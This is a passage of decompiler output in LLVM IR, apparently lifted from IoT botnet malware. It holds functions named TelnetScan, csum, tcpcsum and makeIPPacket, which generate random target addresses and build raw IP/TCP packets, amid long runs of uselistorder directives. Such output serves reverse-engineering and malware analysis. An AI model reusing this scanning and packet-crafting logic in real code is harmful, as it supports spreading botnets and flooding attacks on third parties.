183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1efcc.426 to i32), { 1, 0 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i8* @global_var_29926.88, { 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_29925.87, { 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e3a0, { 1, 0 }
  uselistorder label %dec_label_pc_e36c, { 1, 0 }
  uselistorder label %dec_label_pc_e338, { 1, 0 }
  uselistorder label %dec_label_pc_e304, { 1, 0 }
  uselistorder label %dec_label_pc_e2d0, { 1, 0 }
  uselistorder label %dec_label_pc_e29c, { 1, 0 }
  uselistorder label %dec_label_pc_e268, { 1, 0 }
  uselistorder label %dec_label_pc_e234, { 1, 0 }
  uselistorder label %dec_label_pc_e200, { 1, 0 }
  uselistorder label %dec_label_pc_e1cc, { 1, 0 }
  uselistorder label %dec_label_pc_e198, { 1, 0 }
  uselistorder label %dec_label_pc_e164, { 1, 0 }
  uselistorder label %dec_label_pc_e130, { 1, 0 }
  uselistorder label %dec_label_pc_e0fc, { 1, 0 }
  uselistorder label %dec_label_pc_e0c8, { 1, 0 }
  uselistorder label %dec_label_pc_e094, { 1, 0 }
  uselistorder label %dec_label_pc_e060, { 1, 0 }
  uselistorder label %dec_label_pc_dea8, { 1, 0 }
  uselistorder label %dec_label_pc_de74, { 1, 0 }
  uselistorder label %dec_label_pc_de40, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 1, 0 }
  uselistorder label %dec_label_pc_ddd8, { 1, 0 }
  uselistorder label %dec_label_pc_dda4, { 1, 0 }
  uselistorder label %dec_label_pc_dd70, { 1, 0 }
  uselistorder label %dec_label_pc_dd3c, { 1, 0 }
  uselistorder label %dec_label_pc_dd08, { 1, 0 }
  uselistorder label %dec_label_pc_dcd4, { 1, 0 }
  uselistorder label %dec_label_pc_dca0, { 1, 0 }
  uselistorder label %dec_label_pc_dc6c, { 1, 0 }
  uselistorder label %dec_label_pc_dc38, { 1, 0 }
  uselistorder label %dec_label_pc_dc04, { 1, 0 }
  uselistorder label %dec_label_pc_dbd0, { 1, 0 }
  uselistorder label %dec_label_pc_db9c, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %dec_label_pc_db34, { 1, 0 }
  uselistorder label %dec_label_pc_db00, { 1, 0 }
  uselistorder label %dec_label_pc_dacc, { 1, 0 }
  uselistorder label %dec_label_pc_da98, { 1, 0 }
  uselistorder label %dec_label_pc_da64, { 1, 0 }
  uselistorder label %dec_label_pc_da30, { 1, 0 }
  uselistorder label %dec_label_pc_d9fc, { 1, 0 }
  uselistorder label %dec_label_pc_d9c8, { 1, 0 }
  uselistorder label %dec_label_pc_d994, { 1, 0 }
  uselistorder label %dec_label_pc_d960, { 1, 0 }
  uselistorder label %dec_label_pc_d92c, { 1, 0 }
  uselistorder label %dec_label_pc_d8f8, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 0 }
  uselistorder label %dec_label_pc_d890, { 1, 0 }
  uselistorder label %dec_label_pc_d85c, { 1, 0 }
  uselistorder label %dec_label_pc_d828, { 1, 0 }
  uselistorder label %dec_label_pc_d7f4, { 1, 0 }
  uselistorder label %dec_label_pc_d7c0, { 1, 0 }
  uselistorder label %dec_label_pc_d78c, { 1, 0 }
  uselistorder label %dec_label_pc_d758, { 1, 0 }
  uselistorder label %dec_label_pc_d724, { 1, 0 }
  uselistorder label %dec_label_pc_d6f0, { 1, 0 }
  uselistorder label %dec_label_pc_d6bc, { 1, 0 }
  uselistorder label %dec_label_pc_d688, { 1, 0 }
  uselistorder label %dec_label_pc_d654, { 1, 0 }
  uselistorder label %dec_label_pc_d620, { 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 1, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d550, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d314, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_b9b0, { 1, 0 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
  uselistorder label %dec_label_pc_b948, { 1, 0 }
  uselistorder label %dec_label_pc_b914, { 1, 0 }
  uselistorder label %dec_label_pc_b8e0, { 1, 0 }
  uselistorder label %dec_label_pc_b8ac, { 1, 0 }
  uselistorder label %dec_label_pc_b878, { 1, 0 }
  uselistorder label %dec_label_pc_b844, { 1, 0 }
  uselistorder label %dec_label_pc_b810, { 1, 0 }
  uselistorder label %dec_label_pc_b7dc, { 1, 0 }
  uselistorder label %dec_label_pc_b7a8, { 1, 0 }
  uselistorder label %dec_label_pc_b774, { 1, 0 }
  uselistorder label %dec_label_pc_b740, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6d8, { 1, 0 }
  uselistorder label %dec_label_pc_b6a4, { 1, 0 }
  uselistorder label %dec_label_pc_b670, { 1, 0 }
  uselistorder label %dec_label_pc_b63c, { 1, 0 }
  uselistorder label %dec_label_pc_b608, { 1, 0 }
  uselistorder label %dec_label_pc_b5d4, { 1, 0 }
  uselistorder label %dec_label_pc_b5a0, { 1, 0 }
  uselistorder label %dec_label_pc_b56c, { 1, 0 }
  uselistorder label %dec_label_pc_b538, { 1, 0 }
  uselistorder label %dec_label_pc_b504, { 1, 0 }
  uselistorder label %dec_label_pc_b4d0, { 1, 0 }
  uselistorder label %dec_label_pc_b49c, { 1, 0 }
  uselistorder label %dec_label_pc_b468, { 1, 0 }
  uselistorder label %dec_label_pc_b434, { 1, 0 }
  uselistorder label %dec_label_pc_b400, { 1, 0 }
  uselistorder label %dec_label_pc_b3cc, { 1, 0 }
  uselistorder label %dec_label_pc_b398, { 1, 0 }
  uselistorder label %dec_label_pc_b364, { 1, 0 }
  uselistorder label %dec_label_pc_b330, { 1, 0 }
  uselistorder label %dec_label_pc_b2fc, { 1, 0 }
  uselistorder label %dec_label_pc_b2c8, { 1, 0 }
  uselistorder label %dec_label_pc_b294, { 1, 0 }
  uselistorder label %dec_label_pc_b260, { 1, 0 }
  uselistorder label %dec_label_pc_b22c, { 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b190, { 1, 0 }
  uselistorder label %dec_label_pc_b15c, { 1, 0 }
  uselistorder label %dec_label_pc_b128, { 1, 0 }
  uselistorder label %dec_label_pc_b0f4, { 1, 0 }
  uselistorder label %dec_label_pc_b0c0, { 1, 0 }
  uselistorder label %dec_label_pc_b08c, { 1, 0 }
  uselistorder label %dec_label_pc_b058, { 1, 0 }
  uselistorder label %dec_label_pc_b024, { 1, 0 }
  uselistorder label %dec_label_pc_aff0, { 1, 0 }
  uselistorder label %dec_label_pc_afbc, { 1, 0 }
  uselistorder label %dec_label_pc_af88, { 1, 0 }
  uselistorder label %dec_label_pc_af54, { 1, 0 }
  uselistorder label %dec_label_pc_af20, { 1, 0 }
  uselistorder label %dec_label_pc_aeec, { 1, 0 }
  uselistorder label %dec_label_pc_aeb8, { 1, 0 }
  uselistorder label %dec_label_pc_ae84, { 1, 0 }
  uselistorder label %dec_label_pc_ae50, { 1, 0 }
  uselistorder label %dec_label_pc_ae1c, { 1, 0 }
  uselistorder label %dec_label_pc_ade8, { 1, 0 }
  uselistorder label %dec_label_pc_adb4, { 1, 0 }
}

define i32 @TelnetScan(i32 %arg1) local_unnamed_addr {
entry:
  %v3_e3f4 = load i32, i32* @fp, align 4
  %v2_e408 = load i32, i32* @global_var_2fb88.587, align 4
  %v1_e410 = call i32 @ntohl(i32 %v2_e408)
  %v2_e41c = and i32 %v1_e410, %arg1
  %v0_e424 = call i32 @rand_cmwc()
  %v1_e430 = sub i32 -1, %arg1
  %v2_e434 = and i32 %v0_e424, %v1_e430
  %v2_e43c = xor i32 %v2_e434, %v2_e41c
  store i32 %v3_e3f4, i32* @fp, align 4
  ret i32 %v2_e43c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_e4cc8 = icmp sgt i32 %arg2, 1
  br i1 %v8_e4cc8, label %dec_label_pc_e47c, label %dec_label_pc_e4d0

dec_label_pc_e47c:                                ; preds = %entry, %dec_label_pc_e47c
  %v2_e498 = phi i32 [ %v2_e49c, %dec_label_pc_e47c ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v5_e4a0, %dec_label_pc_e47c ], [ 0, %entry ]
  %stack_var_-36.010 = phi i32 [ %v1_e4bc, %dec_label_pc_e47c ], [ %arg2, %entry ]
  %stack_var_-32.09 = phi i8* [ %v5_e4b4, %dec_label_pc_e47c ], [ %arg1, %entry ]
  %v4_e47c = ptrtoint i8* %stack_var_-32.09 to i32
  %v2_e480 = load i8, i8* %stack_var_-32.09, align 1
  %v3_e480 = zext i8 %v2_e480 to i32
  %v1_e484 = add i32 %v4_e47c, 1
  %v2_e484 = inttoptr i32 %v1_e484 to i8*
  %v3_e484 = load i8, i8* %v2_e484, align 1
  %v4_e484 = zext i8 %v3_e484 to i32
  %v4_e488 = mul nuw nsw i32 %v4_e484, 256
  %v5_e488 = or i32 %v4_e488, %v3_e480
  %v2_e49c = add i32 %v5_e488, %v2_e498
  %v3_e49c = icmp ult i32 %v2_e49c, %v2_e498
  %v4_e4a0 = zext i1 %v3_e49c to i32
  %v5_e4a0 = add i32 %v4_e4a0, %stack_var_-40.011
  %v1_e4b0 = add i32 %v4_e47c, 2
  %v5_e4b4 = inttoptr i32 %v1_e4b0 to i8*
  %v1_e4bc = add nsw i32 %stack_var_-36.010, -2
  %v8_e4cc = icmp sgt i32 %v1_e4bc, 1
  br i1 %v8_e4cc, label %dec_label_pc_e47c, label %dec_label_pc_e4d0

dec_label_pc_e4d0:                                ; preds = %dec_label_pc_e47c, %entry
  %v2_e4f0 = phi i32 [ 0, %entry ], [ %v2_e49c, %dec_label_pc_e47c ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_e4b4, %dec_label_pc_e47c ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_e4a0, %dec_label_pc_e47c ]
  %v7_e4c8.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_e4bc, %dec_label_pc_e47c ]
  %v7_e4c8.lcssa = icmp eq i32 %v7_e4c8.lcssa.in, 1
  br i1 %v7_e4c8.lcssa, label %dec_label_pc_e4dc, label %dec_label_pc_e558.preheader

dec_label_pc_e4dc:                                ; preds = %dec_label_pc_e4d0
  %v2_e4e0 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_e4e0 = zext i8 %v2_e4e0 to i32
  %v2_e4f4 = add i32 %v3_e4e0, %v2_e4f0
  %v3_e4f4 = icmp ult i32 %v2_e4f4, %v2_e4f0
  %v4_e4f8 = zext i1 %v3_e4f4 to i32
  %v5_e4f8 = add i32 %v4_e4f8, %stack_var_-40.0.lcssa
  br label %dec_label_pc_e558.preheader

dec_label_pc_e558.preheader:                      ; preds = %dec_label_pc_e4dc, %dec_label_pc_e4d0
  %v3_e584.ph = phi i32 [ %v2_e4f0, %dec_label_pc_e4d0 ], [ %v2_e4f4, %dec_label_pc_e4dc ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_e4d0 ], [ %v5_e4f8, %dec_label_pc_e4dc ]
  %v3_e55c35 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_e56436 = udiv i32 %v3_e584.ph, 65536
  %v2_e56837 = or i32 %v3_e55c35, %v3_e56436
  %v3_e57038 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_e57839 = or i32 %v2_e56837, %v3_e57038
  %v2_e57c40 = icmp eq i32 %v2_e57839, 0
  br i1 %v2_e57c40, label %dec_label_pc_e584, label %dec_label_pc_e508

dec_label_pc_e508:                                ; preds = %dec_label_pc_e558.preheader, %dec_label_pc_e508
  %v3_e57043 = phi i32 [ %v3_e570, %dec_label_pc_e508 ], [ %v3_e57038, %dec_label_pc_e558.preheader ]
  %v2_e56842 = phi i32 [ %v2_e568, %dec_label_pc_e508 ], [ %v2_e56837, %dec_label_pc_e558.preheader ]
  %v3_e58441 = phi i32 [ %v2_e548, %dec_label_pc_e508 ], [ %v3_e584.ph, %dec_label_pc_e558.preheader ]
  %v2_e51c = urem i32 %v3_e58441, 65536
  %v2_e548 = add i32 %v2_e56842, %v2_e51c
  %v3_e548 = icmp ult i32 %v2_e548, %v2_e51c
  %v4_e54c = zext i1 %v3_e548 to i32
  %v5_e54c = add nuw nsw i32 %v4_e54c, %v3_e57043
  %v3_e55c = mul i32 %v5_e54c, 65536
  %v3_e564 = udiv i32 %v2_e548, 65536
  %v2_e568 = or i32 %v3_e55c, %v3_e564
  %v3_e570 = udiv i32 %v5_e54c, 65536
  %v2_e578 = or i32 %v2_e568, %v3_e570
  %v2_e57c = icmp eq i32 %v2_e578, 0
  br i1 %v2_e57c, label %dec_label_pc_e558.dec_label_pc_e584_crit_edge, label %dec_label_pc_e508

dec_label_pc_e558.dec_label_pc_e584_crit_edge:    ; preds = %dec_label_pc_e508
  br label %dec_label_pc_e584

dec_label_pc_e584:                                ; preds = %dec_label_pc_e558.dec_label_pc_e584_crit_edge, %dec_label_pc_e558.preheader
  %v3_e584.lcssa = phi i32 [ %v2_e548, %dec_label_pc_e558.dec_label_pc_e584_crit_edge ], [ %v3_e584.ph, %dec_label_pc_e558.preheader ]
  %v1_e590 = urem i32 %v3_e584.lcssa, 65536
  %v3_e598 = xor i32 %v1_e590, 65535
  ret i32 %v3_e598

; uselistorder directives
  uselistorder i32 %v2_e568, { 1, 0 }
  uselistorder i32 %v5_e54c, { 1, 0 }
  uselistorder i32 %v2_e548, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e57038, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_e584.ph, { 2, 1, 0 }
  uselistorder i32 %v2_e4f0, { 0, 2, 1 }
  uselistorder i32 %v1_e4bc, { 0, 2, 1 }
  uselistorder i32 %v2_e49c, { 0, 2, 1 }
  uselistorder i32 %v2_e498, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_e508, { 1, 0 }
  uselistorder label %dec_label_pc_e47c, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_e5ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_e5e4 = add i32 %arg1, 12
  %v2_e5e4 = inttoptr i32 %v1_e5e4 to i32*
  %v3_e5e4 = load i32, i32* %v2_e5e4, align 4
  store i32 %v3_e5e4, i32* %stack_var_-44, align 4
  %v1_e60c = call i32 @htons(i32 20)
  %v1_e630 = call i32 @malloc(i32 32)
  %v2_e640 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_e630, i32* @r0, align 4
  store i32 %v2_e640, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_e654 = call i32 @memcpy()
  %v1_e65c = add i32 %v1_e630, 12
  %v3_e660 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_e65c, i32* @r0, align 4
  store i32 %v3_e660, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_e674 = call i32 @memcpy()
  %v2_e680 = inttoptr i32 %v1_e630 to i8*
  %v3_e680 = call i32 @csum(i8* %v2_e680, i32 32)
  %sext2 = mul i32 %v3_e680, 16777216
  %v3_e68c = ashr i32 %sext2, 31
  %v1_e698 = call i32 @free(i32 %v1_e630)
  %v3_e6a0 = sdiv i32 %sext2, 16777216
  %v4_e6a4 = mul nsw i32 %v3_e68c, 256
  %v4_e6a8 = and i32 %v4_e6a4, 65280
  %v5_e6a8 = or i32 %v4_e6a8, %v3_e6a0
  store i32 %v3_e5ac, i32* @fp, align 4
  ret i32 %v5_e6a8

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_e630, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_e6bc = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_e6dc = load i8, i8* %arg1, align 1
  %v4_e6e4 = zext i8 %v2_e6dc to i32
  %v1_e6e8 = and i32 %v4_e6e4, 240
  %v1_e6ec = or i32 %v1_e6e8, 5
  store i32 %v1_e6ec, i32* %r3.global-to-local, align 4
  %v1_e6f8 = trunc i32 %v1_e6ec to i8
  store i8 %v1_e6f8, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_e728 = add i32 %tmp4, 1
  %v4_e728 = inttoptr i32 %v3_e728 to i8*
  store i8 0, i8* %v4_e728, align 1
  %v3_e72c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_e72c, 20
  %v3_e740 = urem i32 %fold, 65536
  store i32 %v3_e740, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_e748 = trunc i32 %fold to i8
  %v3_e748 = add i32 %tmp4, 2
  %v4_e748 = inttoptr i32 %v3_e748 to i8*
  store i8 %v1_e748, i8* %v4_e748, align 1
  %v0_e74c = load i32, i32* %r3.global-to-local, align 4
  %v3_e74c = sdiv i32 %v0_e74c, 256
  store i32 %v3_e74c, i32* %r3.global-to-local, align 4
  %v1_e750 = trunc i32 %v3_e74c to i8
  %v2_e750 = load i32, i32* %r2.global-to-local, align 4
  %v3_e750 = add i32 %v2_e750, 3
  %v4_e750 = inttoptr i32 %v3_e750 to i8*
  store i8 %v1_e750, i8* %v4_e750, align 1
  %v0_e754 = call i32 @rand_cmwc()
  %v3_e760 = urem i32 %v0_e754, 65536
  store i32 %v3_e760, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_e768 = trunc i32 %v0_e754 to i8
  %v3_e768 = add i32 %tmp4, 4
  %v4_e768 = inttoptr i32 %v3_e768 to i8*
  store i8 %v1_e768, i8* %v4_e768, align 1
  %v0_e76c = load i32, i32* %r3.global-to-local, align 4
  %v3_e76c3 = udiv i32 %v0_e76c, 256
  %v1_e770 = trunc i32 %v3_e76c3 to i8
  %v2_e770 = load i32, i32* %r2.global-to-local, align 4
  %v3_e770 = add i32 %v2_e770, 5
  %v4_e770 = inttoptr i32 %v3_e770 to i8*
  store i8 %v1_e770, i8* %v4_e770, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
